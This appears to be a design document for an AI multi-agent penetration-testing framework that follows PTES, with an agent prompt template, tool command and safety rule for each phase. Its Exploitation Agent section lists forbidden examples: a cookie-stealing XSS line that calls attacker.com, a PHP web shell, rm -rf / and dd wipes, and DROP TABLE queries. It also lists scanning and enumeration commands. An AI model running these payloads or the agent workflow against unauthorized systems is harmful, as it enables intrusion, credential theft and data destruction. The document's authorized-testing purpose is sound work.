# Multi-Agent Penetration Testing System Architecture

**Framework**: PTES (Penetration Testing Execution Standard) Compliant
**Standards**: OWASP Testing Guide, NIST SP 800-115, MITRE ATT&CK
**Purpose**: Autonomous, specialized, orchestrated security assessments
**Authorization**: REQUIRED for all operations
**Supports**: External Penetration Testing, Internal Network Penetration Testing, Web Application Assessments, Red Team Engagements

---

## Architecture Overview

```
┌──────────────────────────────────────────────────────────────────┐
│                     ORCHESTRATOR AGENT                            │
│                    (Master Coordinator)                           │
│  - Validates authorization before ANY action                      │
│  - Manages PTES phase transitions                                │
│  - Dispatches specialized agents                                 │
│  - Aggregates findings and correlates vulnerabilities            │
│  - Maintains audit trail                                          │
└───────────────┬──────────────────────────────────────────────────┘
                │
    ┌───────────┴────────────┐
    │                        │
┌───▼────────┐      ┌───────▼────────┐
│  PLANNING  │      │  INTELLIGENCE  │
│   AGENT    │      │    GATHERING   │
│  (PTES 1)  │      │   (PTES 2)     │
└────────────┘      └────┬────────────┘
                         │
              ┌──────────┴──────────┐
              │                     │
      ┌───────▼────────┐    ┌──────▼──────────┐
      │  PASSIVE OSINT │    │  ACTIVE RECON   │
      │     AGENT      │    │     AGENT       │
      └────────────────┘    └─────────────────┘
                                    │
            ┌───────────────────────┴────────────────┐
            │                                        │
   ┌────────▼──────────┐                   ┌────────▼────────────┐
   │  VULNERABILITY    │                   │   EXPLOITATION      │
   │    ANALYSIS       │                   │      AGENT          │
   │     AGENT         │                   │    (PTES 5)         │
   │   (PTES 4)        │                   └─────────────────────┘
   └───────────────────┘                            │
                                           ┌────────▼────────────┐
                                           │ POST-EXPLOITATION   │
                                           │      AGENT          │
                                           │    (PTES 6)         │
                                           └─────────────────────┘
                                                    │
                                           ┌────────▼────────────┐
                                           │   REPORTING AGENT   │
                                           │     (PTES 7)        │
                                           └─────────────────────┘
```

---

## PTES Phase Mapping

| PTES Phase | Agent | Responsibilities |
|-----------|-------|------------------|
| **Phase 1: Pre-Engagement** | Planning Agent | Authorization validation, scope definition, RoE |
| **Phase 2: Intelligence Gathering (Passive)** | Passive OSINT Agent | OSINT, no target contact |
| **Phase 2: Intelligence Gathering (Active)** | Active Recon Agent | DNS enumeration, port scanning |
| **Phase 3: Threat Modeling** | Orchestrator | Attack surface analysis, path planning |
| **Phase 4: Vulnerability Analysis** | Vulnerability Scanner Agent | Vulnerability identification, CVSS scoring |
| **Phase 5: Exploitation** | Exploitation Agent | Non-destructive POC validation |
| **Phase 6: Post-Exploitation** | Post-Exploitation Agent | Privilege escalation paths (simulation) |
| **Phase 7: Reporting** | Reporting Agent | Deliverable generation |

---

## Agent Specifications

### 1. Orchestrator Agent (Master Coordinator)

**Framework Role**: Overall engagement management

**Responsibilities**:
- ✅ **Authorization Enforcement**: Block any action without valid authorization
- ✅ **Phase Management**: Control PTES phase transitions
- ✅ **Agent Dispatch**: Launch appropriate specialized agents
- ✅ **Data Correlation**: Aggregate and correlate findings across agents
- ✅ **Scope Validation**: Ensure all targets remain in authorized scope
- ✅ **Progress Tracking**: Real-time engagement status monitoring
- ✅ **Emergency Stop**: Halt all agents if issues detected

**Decision Points**:
- When to proceed from passive to active reconnaissance
- Which specialized agents to deploy for discovered services
- Whether exploitation validation is warranted (HITL required)
- When engagement is complete and ready for reporting

**Integration**:
- Pentest Monitor Dashboard (real-time visibility)
- SQLite database (audit trail: `pentest_tracker.db`)
- Slash command system (`/engage`, `/scan`, `/validate`, `/report`)

**Prompt Template**:
```markdown
You are the Orchestrator Agent for an authorized penetration test.

ENGAGEMENT: {engagement_id}
CLIENT: {client_name}
AUTHORIZATION: Verified at {authorization_path}
SCOPE: {in_scope_targets}
OUT OF SCOPE: {out_of_scope}
CONSTRAINTS: {rules_of_engagement}

YOUR ROLE:
- Validate authorization before ANY action
- Manage PTES phase progression
- Dispatch specialized agents
- Aggregate findings
- Enforce scope boundaries

CURRENT PHASE: {current_phase}
NEXT ACTIONS: {recommended_actions}
```

---

### 2. Planning Agent (PTES Phase 1)

**Framework Role**: Pre-Engagement Interactions

**Responsibilities**:
- 📋 **Authorization Verification**: Confirm signed authorization letter exists
- 📋 **Scope Definition**: Parse and validate in-scope vs out-of-scope assets
- 📋 **Rules of Engagement**: Extract testing constraints, time windows, prohibited actions
- 📋 **Contact Sheet**: Identify client POC and emergency contacts
- 📋 **Engagement Folder Setup**: Create standardized directory structure

**Deliverables**:
- Engagement workspace initialized
- Authorization status confirmed
- Scope boundaries documented
- Emergency contacts verified

**Tools Used**:
- File system operations (Read, Write)
- Database initialization (SQLite)

**Prompt Template**:
```markdown
You are the Planning Agent for PTES Phase 1: Pre-Engagement.

TASK: Initialize engagement for {client_name}

REQUIRED ACTIONS:
1. Search for authorization letter in provided documents
2. Extract scope (in-scope IPs, domains, networks)
3. Extract out-of-scope items
4. Identify testing constraints (time windows, rate limits, prohibited actions)
5. Extract client contact information
6. Create engagement folder structure per PTES standard
7. Initialize database entry

DELIVERABLE: Engagement initialization report with all metadata
```

---

### 3. Passive OSINT Agent (PTES Phase 2 - Passive)

**Framework Role**: Intelligence Gathering (No Target Contact)

**Specialization**: Open Source Intelligence - **ZERO direct contact with target**

**Responsibilities**:
- 🔍 **Subdomain Discovery**: Certificate Transparency, passive DNS databases
- 🔍 **Email Harvesting**: Search engines, public databases (Hunter.io, theHarvester)
- 🔍 **Employee Enumeration**: LinkedIn, social media (within ethical bounds)
- 🔍 **Technology Stack**: BuiltWith, Wappalyzer, Shodan passive searches
- 🔍 **IP Range Identification**: WHOIS, public registries
- 🔍 **Breach Data**: HaveIBeenPwned, Dehashed (passive lookups)

**Tools & Data Sources**:
- **Certificate Transparency**: crt.sh API, Censys (passive)
- **Search Engines**: Google, Bing, DuckDuckGo (dorking)
- **Subdomain Aggregators**: Amass (passive mode), Sublist3r (passive sources)
- **Email Databases**: Hunter.io API, theHarvester (passive sources only)
- **Threat Intelligence**: Shodan (organization search, no scanning), VirusTotal
- **Social Media**: LinkedIn (public profiles), GitHub (public repos)

**CRITICAL CONSTRAINT**: Absolutely NO DNS queries, port scans, or HTTP requests to target

**Deliverable**: JSON intelligence report with discovered assets, emails, employees, technologies

**Prompt Template**:
```markdown
You are the Passive OSINT Agent for PTES Phase 2 (Passive Intelligence Gathering).

TARGET: {target_domain}
AUTHORIZATION: Confirmed

STRICT RULES:
❌ NO DNS queries to target
❌ NO port scanning
❌ NO HTTP requests to target
✅ ONLY use passive sources (search engines, public databases, CT logs)

TASKS:
1. Certificate Transparency: Query crt.sh for %.{target_domain}
2. Passive Amass: amass enum -passive -d {target_domain}
3. Shodan: Search org:"{organization_name}" (no direct scanning)
4. Email Harvesting: theHarvester -b hunter,linkedin (passive sources)
5. Social Media: LinkedIn public profiles for {organization_name}
6. GitHub: Search "{target_domain}" (public repos, exposed secrets)

DELIVERABLE: JSON report with:
- Discovered subdomains (source: CT logs, passive DNS)
- Email addresses (source: public databases)
- Employee names and roles (source: LinkedIn public)
- Technology stack (source: Shodan passive, Wappalyzer)
- IP ranges (source: WHOIS, public registries)
```

---

### 4. Active Reconnaissance Agent (PTES Phase 2 - Active)

**Framework Role**: Intelligence Gathering (Direct Target Interaction)

**Specialization**: DNS enumeration, port scanning, service fingerprinting

**Responsibilities**:
- 🎯 **DNS Enumeration**: Zone transfers, brute force, record enumeration
- 🎯 **Host Discovery**: ICMP, ARP, TCP/UDP ping sweeps
- 🎯 **Port Scanning**: Multi-stage (discovery → focused → comprehensive)
- 🎯 **Service Fingerprinting**: Version detection, banner grabbing
- 🎯 **OS Detection**: TTL, TCP fingerprinting
- 🎯 **Technology Stack**: Active probing (HTTP headers, error pages)

**Tools**:
- **DNS**: DNSRecon, DNSenum, Fierce, Gobuster DNS mode
- **Port Scanning**: Nmap (multi-stage approach)
- **Service Detection**: Nmap `-sV`, banner grabbing
- **Web**: WhatWeb, Wappalyzer active mode

**Rate Limiting**: Built-in throttling (`-T4` for Nmap, `--delay` for DNS tools)

**Deliverable**: Complete asset inventory with:
- Resolved hostnames
- Open ports per host
- Service versions
- Operating system identification

**Prompt Template**:
```markdown
You are the Active Reconnaissance Agent for PTES Phase 2 (Active Intelligence Gathering).

INPUT: Targets from Passive OSINT Agent
SCOPE: {authorized_targets}

AUTHORIZATION CHECK:
✅ Verify each target is in authorized scope before scanning
✅ Respect Rules of Engagement (time windows, rate limits)

MULTI-STAGE SCANNING APPROACH:

Stage 1: Host Discovery
- nmap -sn {targets} -T4 --reason (ping sweep)
- Identify live hosts

Stage 2: DNS Enumeration
- dnsrecon -d {domain} -t std,brt,srv,axfr
- dnsenum {domain} --enum
- fierce --domain {domain}

Stage 3: Port Scanning (Conservative → Aggressive)
- nmap -sV --top-ports 1000 {live_hosts} -T4 -Pn --open
- If authorized: Full 65535 port scan on high-value targets

Stage 4: Service Fingerprinting
- nmap -sV -sC {discovered_ports} -T4
- Banner grabbing for detailed version info

RATE LIMITING:
- Nmap: -T4 (not -T5 to avoid DoS)
- DNS: --delay 1 (avoid overwhelming DNS servers)
- Monitor for 429/503 responses (back off if detected)

DELIVERABLE: JSON asset inventory with ports, services, versions
```

---

### 5. Vulnerability Scanner Agent (PTES Phase 4)

**Framework Role**: Vulnerability Analysis

**Specialization**: Identify security weaknesses across all discovered services

**Responsibilities**:
- 🔎 **Web Vulnerabilities**: OWASP Top 10, directory enumeration, SSL/TLS issues
- 🔎 **Network Services**: Default credentials, misconfigurations, known CVEs
- 🔎 **Modern Web Apps**: SPA testing with Playwright (JavaScript execution)
- 🔎 **API Security**: REST/GraphQL enumeration, authentication flaws
- 🔎 **CVSS Scoring**: Assign severity to all findings
- 🔎 **CVE Correlation**: Match versions to known vulnerabilities

**Tools by Service Type**:

**HTTP/HTTPS**:
- Nikto (web server vulnerabilities)
- Gobuster/Dirb (directory enumeration)
- Playwright (SPA testing, JavaScript-heavy apps)
- WPScan (WordPress)
- testssl.sh (SSL/TLS analysis)

**FTP**:
- Anonymous access check
- Version vulnerability lookup

**SSH**:
- Weak cipher detection
- Auth method enumeration

**SMB**:
- Enum4linux (shares, users, groups)
- Null session check

**Database** (if exposed):
- Default credentials
- Information disclosure

**Deliverable**: Prioritized vulnerability list with:
- Finding ID, Title, Severity (Critical/High/Medium/Low)
- CVSS v3.1 score
- CVE/CWE references
- Affected target/service
- Remediation recommendations

**Prompt Template**:
```markdown
You are the Vulnerability Scanner Agent for PTES Phase 4.

INPUT: Service inventory from Active Recon Agent
SERVICES: {service_list}

FOR EACH SERVICE, RUN APPROPRIATE SCANNER:

HTTP/HTTPS Services:
1. Technology Detection: WhatWeb {url}
2. Vulnerability Scan: nikto -h {url} -maxtime 5m
3. Directory Enumeration: gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt
4. IF SPA Detected → Launch Playwright deep dive:
   - Browser automation testing
   - JavaScript security analysis
   - API endpoint discovery
   - Client-side storage inspection

FTP Services:
1. Anonymous access: ftp {host} (attempt anonymous:anonymous)
2. Version check: nmap -sV -p 21 {host}
3. CVE lookup for discovered version

SSH Services:
1. Cipher enumeration: nmap --script ssh2-enum-algos -p 22 {host}
2. Auth methods: nmap --script ssh-auth-methods -p 22 {host}

SMB Services:
1. enum4linux -a {host}
2. Null session check
3. Share enumeration

FOR ALL FINDINGS:
- Assign CVSS v3.1 score
- Map to CWE/CVE if applicable
- Provide remediation guidance
- Categorize by OWASP/SANS/MITRE as appropriate

DELIVERABLE: Vulnerability report with severity-sorted findings
```

---

### 6. Exploitation Agent (PTES Phase 5)

**Framework Role**: Exploitation (Non-Destructive Proof-of-Concept)

**Specialization**: Safe validation of discovered vulnerabilities

**CRITICAL SAFETY CONSTRAINTS**:
- ❌ **NO Data Exfiltration**: Never extract actual client data
- ❌ **NO File Modifications**: No writes, deletes, or alterations
- ❌ **NO Persistence**: No backdoors, scheduled tasks, or autoruns
- ❌ **NO Privilege Escalation Beyond POC**: Stop at proof of concept
- ❌ **NO Lateral Movement**: Don't pivot to other systems without explicit authorization
- ✅ **Read-Only Operations Only**
- ✅ **Immediate Cleanup**: Delete test files, logout after demos
- ✅ **HITL Approval Required**: Human must approve BEFORE any exploitation

**Safe Proof-of-Concept Techniques**:

**SQL Injection**:
```sql
-- GOOD: Version disclosure (read-only)
SELECT @@version
SELECT database()

-- BAD: Data modification (NEVER)
DROP TABLE users
DELETE FROM accounts
```

**Cross-Site Scripting (XSS)**:
```javascript
// GOOD: Alert box with unique identifier
alert('PENTEST-' + Date.now());

// BAD: Actual credential theft (NEVER)
document.location='http://attacker.com/steal?c='+document.cookie
```

**Remote Code Execution (RCE)**:
```bash
# GOOD: Identity proof (read-only)
whoami
id
hostname

# BAD: Destructive commands (NEVER)
rm -rf /
dd if=/dev/zero of=/dev/sda
```

**Authentication Bypass**:
```
GOOD Flow:
1. Demonstrate bypass (login as admin)
2. Screenshot dashboard
3. IMMEDIATE logout
4. Document steps

BAD Flow:
1. Login as admin
2. Create new admin account (persistence)
3. Exfiltrate user database
```

**File Upload**:
```php
// GOOD: Benign test file
<?php phpinfo(); ?>

// Create test.txt with "PENTEST MARKER"
// Upload, screenshot, DELETE immediately

// BAD: Web shell (NEVER)
<?php system($_GET['cmd']); ?>
```

**HITL (Human-in-the-Loop) Approval Process**:
```
1. Agent identifies exploitable vulnerability
2. AskUserQuestion: "Validate {vuln_title} on {target}?"
   Options:
   - "Validate (Safe POC)" → Proceed
   - "Skip validation" → Document as theoretical
3. Log approval decision to database (audit trail)
4. Execute safe POC
5. Screenshot evidence
6. Immediate cleanup
```

**Deliverable**: Validated findings with:
- Screenshots of successful exploitation
- Exact reproduction steps (for client to reproduce)
- Impact assessment
- Evidence of cleanup (logged out, files deleted)

**Prompt Template**:
```markdown
You are the Exploitation Agent for PTES Phase 5.

INPUT: Vulnerabilities from Scanner Agent
FINDING: {vuln_title} ({severity})
TARGET: {affected_target}

CRITICAL SAFETY PROTOCOL:
❌ NO data exfiltration
❌ NO file modifications
❌ NO persistence mechanisms
✅ Read-only operations only
✅ Immediate cleanup required

HITL CHECKPOINT:
Before ANY exploitation, use AskUserQuestion:

Question: "Validate {vuln_title} on {target}?"
Options:
  1. "Validate (Safe POC)" - Proceed with non-destructive test
  2. "Skip Validation" - Document without exploitation

IF APPROVED:

1. Execute safe proof-of-concept:
   - SQL Injection → SELECT @@version (read-only query)
   - XSS → alert('PENTEST-MARKER')
   - RCE → whoami, id, hostname (never rm, dd, destructive)
   - Auth Bypass → Login, screenshot, IMMEDIATE logout
   - File Upload → test.txt with "PENTEST", upload, screenshot, DELETE

2. Collect evidence:
   - Screenshot before, during, after
   - Document exact reproduction steps
   - Save HTTP requests/responses

3. Immediate cleanup:
   - Delete uploaded test files
   - Logout from bypassed accounts
   - Verify no persistence left behind

4. Log to database:
   - Finding validated: YES
   - Exploitation method: {technique}
   - Evidence collected: {screenshots}
   - Cleanup completed: YES

DELIVERABLE: Validated finding with evidence and reproduction steps
```

---

### 7. Post-Exploitation Agent (PTES Phase 6)

**Framework Role**: Post-Exploitation (SIMULATION ONLY)

**Specialization**: Document attack paths and potential impact (WITHOUT executing)

**IMPORTANT**: This agent does NOT perform actual post-exploitation. It **simulates** and **documents** what COULD be done.

**Responsibilities**:
- 🎯 **Privilege Escalation Paths**: Identify potential routes (don't execute)
- 🎯 **Lateral Movement**: Map possible pivots to other systems (don't execute)
- 🎯 **Data Access**: Document what data COULD be accessed (don't exfiltrate)
- 🎯 **Persistence Methods**: Identify where attacker COULD maintain access (don't create)
- 🎯 **Impact Assessment**: Business impact of compromised system

**Techniques (DOCUMENTATION ONLY)**:

**Privilege Escalation (Simulated)**:
```bash
# Document potential paths (don't execute):
- Kernel exploits available for discovered OS version
- Sudo misconfigurations (if found)
- Writable /etc/passwd (if discovered)
- SUID binaries that could be abused

# Example documentation:
"System running Ubuntu 20.04 with kernel 5.4.0-42. CVE-2021-3493
could allow privilege escalation to root. POC available but NOT executed."
```

**Lateral Movement (Simulated)**:
```
# Document potential pivots (don't execute):
- Shared credentials discovered (could access other systems)
- Network trust relationships (domain admin on workstation)
- Cached credentials in memory (Mimikatz could extract)

# Example documentation:
"Discovered domain admin credentials in LSASS memory dump. Could pivot
to 50+ domain-joined servers. Movement NOT attempted."
```

**Data Access (Simulated)**:
```
# Document accessible data (don't exfiltrate):
- Database contains 100K customer records (visible via SELECT COUNT(*))
- File server has /finance share with budget documents
- Email server accessible with compromised credentials

# Example documentation:
"SQL injection provides access to 'customers' table with PII fields:
SSN, DOB, credit_card_number. Sample query shows 100,523 records.
NO data extracted."
```

**Deliverable**: Post-exploitation simulation report:
- Potential privilege escalation paths (with CVEs)
- Lateral movement opportunities (network diagrams)
- Accessible sensitive data (types, volumes)
- Persistence methods available
- Overall impact assessment

**Prompt Template**:
```markdown
You are the Post-Exploitation Agent for PTES Phase 6.

INPUT: Successfully exploited vulnerabilities from Exploitation Agent
ACCESS LEVEL: {current_access}
COMPROMISED SYSTEM: {target_system}

SIMULATION ONLY - DO NOT EXECUTE:

1. Privilege Escalation Analysis:
   - Check OS version for kernel exploits (search exploit-db)
   - Analyze sudo permissions (if accessible)
   - Identify SUID binaries (if file system readable)
   - Document potential paths to root/SYSTEM

2. Lateral Movement Mapping:
   - Identify network trust relationships
   - Document cached credentials (don't extract)
   - Map potential pivot targets
   - Analyze Active Directory paths (if domain environment)

3. Data Access Assessment:
   - Document database contents (SELECT COUNT(*), don't extract)
   - Identify file shares with sensitive data
   - Assess email server access
   - Calculate PII exposure (types and volumes)

4. Persistence Analysis:
   - Document where backdoors COULD be placed
   - Identify scheduled task opportunities
   - Analyze startup locations
   - (DO NOT create any persistence)

5. Impact Assessment:
   - Business impact of this compromise
   - Regulatory implications (GDPR, HIPAA, PCI DSS)
   - Potential ransom attacker motivations

DELIVERABLE: Simulation report with attack paths and impact (NO actual execution)
```

---

### 8. Reporting Agent (PTES Phase 7)

**Framework Role**: Reporting and Deliverables

**Specialization**: Professional report generation for client delivery

**Responsibilities**:
- 📊 **Executive Summary**: Non-technical, business-focused findings
- 📊 **Technical Report**: Detailed vulnerability analysis with CVSS
- 📊 **Evidence Package**: All screenshots, logs, command outputs
- 📊 **Remediation Roadmap**: Prioritized fixes with effort estimates
- 📊 **Appendices**: Methodology, tools, scope, references

**Report Sections**:

**1. Executive Summary**:
- Engagement overview (dates, scope, objectives)
- Key findings summary (count by severity)
- Overall risk rating (Critical/High/Medium/Low)
- Business impact assessment
- Top 3-5 immediate recommendations

**2. Technical Findings**:
For each vulnerability:
- Finding ID: VULN-001, VULN-002, etc.
- Title: Descriptive name
- Severity: Critical/High/Medium/Low
- CVSS v3.1 Score: Base score and vector string
- Affected Asset: Target system/service
- Description: Technical details
- Proof of Concept: Exact reproduction steps
- Evidence: Screenshots, logs, HTTP requests
- Impact: CIA (Confidentiality, Integrity, Availability)
- Remediation: Specific fix recommendations
- References: CVE, CWE, OWASP, NIST

**3. Remediation Roadmap**:
- Quick wins (low effort, high impact)
- Short-term fixes (1-3 months)
- Long-term improvements (strategic security posture)
- Effort estimates (Low/Medium/High)
- Priority matrix (Risk vs Effort)

**4. Appendices**:
- Methodology: PTES phases executed
- Tools and versions used
- Scope definition (in-scope vs out-of-scope)
- Rules of Engagement
- Complete command log
- MITRE ATT&CK technique mapping

**Output Formats**:
- PDF (primary deliverable)
- Markdown (for version control)
- JSON (for integration with security tools)
- CSV (for findings import into ticketing systems)

**Deliverable**: Complete pentest report ready for client delivery

**Prompt Template**:
```markdown
You are the Reporting Agent for PTES Phase 7.

INPUT:
- Engagement metadata: {engagement_name}, {client_name}, {dates}, {scope}
- All findings from all agents (Passive OSINT, Active Recon, Vuln Analysis, Exploitation, Post-Exploit)
- Evidence: Screenshots, logs, command outputs
- Commands executed: Complete audit trail

GENERATE PROFESSIONAL PENTEST REPORT:

1. EXECUTIVE SUMMARY (1-2 pages, non-technical):
   - Engagement overview
   - Findings summary: {critical_count} Critical, {high_count} High, {medium_count} Medium, {low_count} Low
   - Overall risk rating: {overall_risk}
   - Business impact in plain language
   - Top 5 recommendations (action-oriented)

2. TECHNICAL REPORT (detailed):
   FOR EACH FINDING:
   - Finding ID: VULN-{number}
   - Title: {descriptive_title}
   - Severity: {severity} (with justification)
   - CVSS v3.1 Score: {score} (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
   - Affected Asset: {target}:{port}/{service}
   - Description: Technical explanation
   - Proof of Concept: Step-by-step reproduction
   - Evidence: [Screenshot: evidence/vuln-001-sql-injection.png]
   - Impact: Confidentiality: HIGH, Integrity: HIGH, Availability: NONE
   - Remediation: Specific fix (use parameterized queries, patch to version X.Y)
   - References: CVE-2023-XXXXX, CWE-89, OWASP A03:2021

3. REMEDIATION ROADMAP:
   - Quick Wins (Priority 1):
     * Finding VULN-003: Disable FTP service (Effort: Low, Impact: Medium)
     * Finding VULN-007: Apply SSL patch (Effort: Low, Impact: High)

   - Short-Term (Priority 2):
     * Finding VULN-001: Implement CSRF tokens (Effort: Medium, Impact: High)
     * Finding VULN-005: Add CAPTCHA to registration (Effort: Medium, Impact: Medium)

   - Long-Term (Priority 3):
     * Implement WAF (Effort: High, Impact: High)
     * Security awareness training (Effort: Medium, Impact: Medium)

4. APPENDICES:
   - Appendix A: Testing Methodology (PTES phases)
   - Appendix B: Tools and Versions
   - Appendix C: Scope Definition
   - Appendix D: Rules of Engagement
   - Appendix E: Complete Command Log
   - Appendix F: MITRE ATT&CK Mapping

DELIVERABLE: Professional pentest report (PDF + Markdown + JSON)
```

---

## Agent Communication & Data Flow

### Data Flow Diagram

```
┌─────────────────┐
│  Orchestrator   │
│     Agent       │
└────────┬────────┘
         │
         │ 1. Dispatch Planning Agent
         ▼
┌─────────────────┐
│  Planning Agent │ → Authorization ✅ → Scope → RoE
└────────┬────────┘
         │
         │ 2. Dispatch Passive OSINT
         ▼
┌──────────────────┐
│ Passive OSINT    │ → Subdomains → Emails → Tech Stack
│     Agent        │
└────────┬─────────┘
         │
         │ 3. Validate Scope & Dispatch Active Recon
         ▼
┌──────────────────┐
│  Active Recon    │ → DNS → Ports → Services
│     Agent        │
└────────┬─────────┘
         │
         │ 4. Dispatch Vuln Scanners (parallel per service)
         ▼
┌──────────────────┐
│ Vulnerability    │ → Findings → CVSS → CVE Mapping
│ Scanner Agents   │
│  (Multiple)      │
└────────┬─────────┘
         │
         │ 5. HITL Approval → Dispatch Exploitation
         ▼
┌──────────────────┐
│  Exploitation    │ → Safe POC → Evidence → Cleanup
│     Agent        │
└────────┬─────────┘
         │
         │ 6. Dispatch Post-Exploit Simulation
         ▼
┌──────────────────┐
│ Post-Exploitation│ → Attack Paths → Impact Assessment
│     Agent        │
└────────┬─────────┘
         │
         │ 7. Dispatch Reporting
         ▼
┌──────────────────┐
│  Reporting Agent │ → Executive Summary → Technical Report
└──────────────────┘
         │
         ▼
    📄 Final Deliverable
```

---

## Shared Data Store (Pentest Monitor Database)

**Location**: `tools/athena-monitor/pentest_tracker.db`

**Schema**:

```sql
-- Engagements table
CREATE TABLE engagements (
    id INTEGER PRIMARY KEY,
    name TEXT UNIQUE,
    client TEXT,
    engagement_type TEXT,
    started_at TEXT,
    completed_at TEXT,
    scope TEXT,
    out_of_scope TEXT,
    authorization_verified INTEGER,
    status TEXT  -- 'active', 'paused', 'completed'
);

-- Commands table (all agent activities)
CREATE TABLE commands (
    id INTEGER PRIMARY KEY,
    timestamp TEXT,
    engagement TEXT,
    phase TEXT,  -- 'Pre-Engagement', 'Passive OSINT', 'Active Recon', etc.
    agent TEXT,  -- Which agent executed this
    command TEXT,
    tool TEXT,
    target TEXT,
    output TEXT,
    duration_seconds REAL
);

-- Findings table
CREATE TABLE findings (
    id INTEGER PRIMARY KEY,
    timestamp TEXT,
    engagement TEXT,
    severity TEXT,  -- 'CRITICAL', 'HIGH', 'MEDIUM', 'LOW'
    category TEXT,
    title TEXT,
    description TEXT,
    target TEXT,
    cvss_score REAL,
    cve_id TEXT,
    cwe_id TEXT,
    validated INTEGER,  -- 0 = theoretical, 1 = exploited
    evidence_path TEXT
);

-- HITL Approvals table
CREATE TABLE hitl_approvals (
    id INTEGER PRIMARY KEY,
    timestamp TEXT,
    engagement TEXT,
    agent TEXT,
    action TEXT,  -- What action was approved
    decision TEXT,  -- 'APPROVED', 'DENIED'
    justification TEXT
);

-- Agent Activity table
CREATE TABLE agent_activity (
    id INTEGER PRIMARY KEY,
    timestamp TEXT,
    engagement TEXT,
    agent_type TEXT,  -- 'passive-osint', 'active-recon', etc.
    agent_id TEXT,  -- Unique agent instance ID
    status TEXT,  -- 'spawned', 'running', 'completed', 'failed'
    input_data TEXT,  -- JSON input
    output_data TEXT  -- JSON output
);
```

---

## Implementation (Next Steps)

### Phase 1: Create Agent Prompts
- ✅ Define all 8 agent prompt templates
- ✅ Create agent configuration files

### Phase 2: Build Orchestrator
- ⏳ Implement orchestrator logic
- ⏳ PTES phase transition logic
- ⏳ Agent dispatch system

### Phase 3: Integrate with Slash Commands
- ⏳ `/engage` → Spawns Planning Agent + Orchestrator
- ⏳ `/recon` → Spawns OSINT/Recon agents
- ⏳ `/scan` → Spawns Vulnerability Scanner agents
- ⏳ `/validate` → Spawns Exploitation Agent (with HITL)
- ⏳ `/report` → Spawns Reporting Agent

### Phase 4: Test Multi-Agent Workflow
- ⏳ Test on sample engagement (non-client data)
- ⏳ Validate agent communication
- ⏳ Verify database logging
- ⏳ Optimize for speed

---

**Created**: December 16, 2025
**Version**: 1.0 - PTES Compliant Multi-Agent Architecture
**Status**: Design Complete - Ready for Implementation
**No Client Data**: Uses placeholders for all examples
